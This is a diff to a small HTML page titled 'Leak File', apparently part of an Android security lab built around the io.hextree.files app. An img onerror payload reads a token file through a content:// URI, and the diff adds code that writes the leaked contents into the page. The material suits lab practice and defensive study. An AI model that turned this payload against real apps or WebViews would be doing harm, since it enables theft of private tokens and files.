@@ -5,6 +5,7 @@
     <title>Leak File</title>
   </head>
   <body>
+    <div id='gang'></div>
     <img src=x onerror='leakFileIframe("content://io.hextree.files/other_files/token.txt")'>
     <script>
         function leakFileIframe(url) {
@@ -23,6 +24,10 @@
             });
             contentPromise.then((content) => {
               if (content) {
+                const gang = document.getElementById("gang");
+                const pre = document.createElement("pre");
+                pre.textContent = content;
+                gang.appendChild(pre);
                 console.log(content);
               }
             });
